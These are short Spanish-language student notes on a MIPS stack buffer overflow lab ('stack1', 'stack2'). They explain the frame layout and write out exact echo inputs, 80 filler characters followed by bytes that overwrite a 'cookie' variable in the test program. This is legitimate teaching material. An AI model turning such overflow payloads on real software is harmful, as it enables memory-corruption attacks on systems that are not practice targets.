Copiar los códigos a MIPS.
Compilar en MIPS:	gcc -Wall -O0 stack.c
A stack1.c mandarle los 84 caracteres:	00000000000000000000000000000000000000000000000000000000000000000000000000000000DCBA

echo 00000000000000000000000000000000000000000000000000000000000000000000000000000000DCBA| ./a.out

El buffer del que lee arranca en 24(fp) hasta fp(103), es decir 80 caracteres.
Inmediatamente despues (o sea, más arriba) esta el valor de la 'cookie'
Llenando el buffer con 80 y sobreescribiendo los 4 bytes (con 4 chars) de la cookie se logra lo pedido.

Stack1 
echo 00000000000000000000000000000000000000000000000000000000000000000000000000000000DCBA| ./a.out
Hexa	41 42 43 44 (A lo que tiene que ser igual la cookie)
Deci	65 66 67 68 (Lo que mando con los chars)
Char	A  B  C  D



Stack2
echo -ne '00000000000000000000000000000000000000000000000000000000000000000000000000000000\x05\x03\x02\x01' | ./a.out
Hexa    01 02 03 05


00000000000000000000000000000000000000000000000000000000000000000000000000000000^E^C^B^A
ctrl+shift+E
ctrl+shift+C (problemas por el trap de ctrl+c, termina el programa).
ctrl+shift+B
ctrl+shift+A
